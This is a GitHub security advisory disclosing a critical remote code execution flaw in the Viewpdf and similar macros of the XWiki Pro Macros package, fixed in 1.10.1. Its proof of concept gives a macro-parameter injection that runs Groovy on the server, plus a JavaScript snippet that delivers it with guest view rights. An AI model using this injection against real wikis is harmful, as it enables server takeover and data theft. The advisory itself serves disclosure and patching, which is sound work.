# Remote Code Execution via Viewpdf and similar macros

Critical

[oanalavinia](/oanalavinia)
published
GHSA-cfq3-q227-7j65
Aug 12, 2024

## Package

maven

com.xwiki.pro:xwiki-pro-macros
([Maven](/advisories?query=ecosystem%3Amaven))

## Affected versions

>= 1.0

## Patched versions

1.10.1

## Description

### Summary

Missing escaping in the Viewpdf macro allows any user with view right on the `CKEditor.HTMLConverter` page or edit or comment right on any page to perform remote code execution. Other macros like Viewppt are vulnerable to the same kind of attack.

### Details

The issue is that the Viewpdf macro inserts the parameter without escaping in a context where XWiki syntax is executed: <https://github.com/xwikisas/xwiki-pro-macros/blob/main/xwiki-pro-macros-ui/src/main/resources/Confluence/Macros/Viewpdf.xml#L265-L267>

### PoC

It is sufficient to use the Viewpdf macro with a "name" parameter like `" /}}{{async}}{{groovy}}println("Hello from Groovy!"){{/groovy}}` to execute any Groovy code on the server. This can also be done via the `CKEditor.HTMLConverter`, the following JavaScript snippet can be used on any page to demonstrate this from just view right:

```
(function (text) {
  const url = new URL(document.location);
  url.searchParams.append('sheet', 'CKEditor.HTMLConverter');
  url.searchParams.append('formToken', document.documentElement.dataset.xwikiFormToken);
  url.searchParams.append('toHTML', 'true');
  url.searchParams.append('text', text);
 document.location = url;
})('{{viewpdf name="~"/}}{{async}}{{groovy}}services.logging.getLogger(/attacker/).error(/Hello from Groovy!/){{/groovy}}{{/async}}" /}}');
```

If an error message "Hello from Groovy" appears in XWiki's log, the installation is vulnerable. Note that this doesn't require any user account, standard guest view rights are enough.

### Impact

Remote code execution allows accessing and modifying all data that is stored in the XWiki instance and possibly accessing the server on which XWiki is running. This affects the confidentiality, integrity and availability of the whole XWiki installation and all data in the wiki.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
